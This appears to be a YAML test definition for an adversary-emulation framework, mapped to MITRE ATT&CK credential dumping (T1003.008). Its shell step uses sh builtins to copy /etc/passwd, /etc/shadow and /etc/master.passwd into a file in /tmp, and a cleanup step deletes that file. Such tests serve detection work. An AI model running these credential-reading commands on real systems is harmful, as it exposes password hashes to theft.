api_version: "2.0"
name: Access /etc/{shadow,passwd,master.passwd} with shell builtins
description: |
    Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins
args:
    - name: output_file
      type: path
      default: /tmp/T1003.008.txt
uuid: f5aa6543-6cb2-4fae-b9c2-b96e14721713
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.008: /etc/passwd and /etc/shadow'
requirements:
    platforms:
        - os: linux
steps:
    - name: access-/etc/{shadow,passwd,master.passwd}-with-shell-builtins
      inline: |
        testcat(){ (while read line; do echo $line >> {{.Args.output_file}}; done < $1) }
        [ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
        testcat /etc/passwd
        testcat /etc/shadow
      executor: sh
      cleanup:
        inline: |
            rm -f {{.Args.output_file}}
        executor: sh
